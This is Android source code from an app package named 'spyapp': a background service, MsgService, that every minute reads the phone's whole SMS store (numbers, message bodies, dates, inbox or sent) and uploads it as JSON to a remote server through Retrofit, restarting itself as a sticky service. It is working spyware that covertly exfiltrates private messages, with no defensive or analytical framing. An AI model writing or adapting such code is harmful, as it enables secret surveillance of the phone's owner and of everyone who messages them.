package kkactive_india.in.spyapp;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.CountDownTimer;
import android.os.IBinder;
import android.provider.Telephony;
import android.support.annotation.Nullable;
import android.util.Log;

import com.google.gson.Gson;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import kkactive_india.in.spyapp.Database.DatabaseHelper;
import kkactive_india.in.spyapp.msgPOJO.MsgBean;
import kkactive_india.in.spyapp.msgPOJO.MsgDatum;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.converter.scalars.ScalarsConverterFactory;

import static java.security.AccessController.getContext;

public class MsgService extends Service {

    String address, body, date, type,id;
    Date dateFormat;
    List<MsgDatum> data = new ArrayList<>();
    SharedPreferences pref;
    SharedPreferences.Editor edit;
    Timer timer;
    ConnectionDetector cd;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

        cd = new ConnectionDetector(getApplication());

        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {

        Log.d("ServiceSarted", "yessBhai");


        pref = getSharedPreferences("pref", Context.MODE_PRIVATE);
        edit = pref.edit();
        List<String> sms = new ArrayList<String>();
        Uri uriSMSURI = Uri.parse("content://sms");
        StringBuffer sb = new StringBuffer();
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, strOrder);

        sb.append("SMS Details :");
        while (cur != null && cur.moveToNext()) {
            id = cur.getString(cur.getColumnIndexOrThrow("_id"));
            address = cur.getString(cur.getColumnIndex("address"));
            body = cur.getString(cur.getColumnIndexOrThrow("body"));
            date = cur.getString(cur.getColumnIndexOrThrow("date"));
            dateFormat = new Date(Long.valueOf(date));
            type = null;
            switch (Integer.parseInt(cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                case Telephony.Sms.MESSAGE_TYPE_INBOX:
                    type = "inbox";
                    break;
                case Telephony.Sms.MESSAGE_TYPE_SENT:
                    type = "sent";
                    break;
                /*case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                    type = "draft";
                    break;*/
                default:
                    break;
            }


            MsgDatum person = new MsgDatum();
            person.setMobile(address);
            person.setMessage(body);
            person.setDate(String.valueOf(dateFormat));
            person.setType(type);
            data.add(person);


           /* DatabaseHelper db = new DatabaseHelper(getApplication());

            Boolean result = db.insert(id,address, body, type, String.valueOf(dateFormat));

            Log.d("gayaDatabaseMai", String.valueOf(result));*/


            sms.add("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);

            sb.append("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);
            sb.append("\n-----------------");
        }
        Log.d("SMSS", sms.toString());
        //textView.setText(sb);



        if (cur != null) {
            cur.close();
        }
        //return sms;

             /*   final DatabaseHelper db = new DatabaseHelper(getApplicationContext());
                Cursor c = db.getMsgs();

                if (c != null)
                    while (c.moveToNext()) {
                    MsgDatum person = new MsgDatum();
                    person.setMobile(c.getString(c.getColumnIndex("phone")));
                      person.setMessage(c.getString(c.getColumnIndex("body")));
                      person.setDate(c.getString(c.getColumnIndex("date")));
                      person.setType(c.getString(c.getColumnIndex("type")));
                      data.add(person);
                    }*/



               // data.clear();

                if (cd.isConnectingToInternet()) {

                    Bean b = (Bean) getApplicationContext();

                    Retrofit retrofit = new Retrofit.Builder()
                            .baseUrl(b.baseURL)
                            .addConverterFactory(ScalarsConverterFactory.create())
                            .addConverterFactory(GsonConverterFactory.create())
                            .build();
                    Allapi cr = retrofit.create(Allapi.class);
                    MsgBean body = new MsgBean();
                    body.setMsgData(data);

                    Gson gsonObj = new Gson();

                    String jsonStr = gsonObj.toJson(body);
                    String id = pref.getString("id", "");
                    Log.d("idHaiKyaBhai", id);
                    Log.d("idHaiKyaBhai", pref.getString("id", ""));
                    Log.d("idHaikya", jsonStr);
                    Call<MsgBean> call = cr.msgs(id, jsonStr);
                    call.enqueue(new Callback<MsgBean>() {
                        @Override
                        public void onResponse(Call<MsgBean> call, Response<MsgBean> response) {
                            Log.d("messageGaya?", "haanGaya");
                            data.clear();
                        }

                        @Override
                        public void onFailure(Call<MsgBean> call, Throwable t) {
                            Log.d("messageGaya?", "nahiGaya");
                            Log.d("kyuNahiGaya?", t.toString());

                        }
                    });
                }

            }
        }, 0, 1000 * 60);

        return START_STICKY;
    }
}
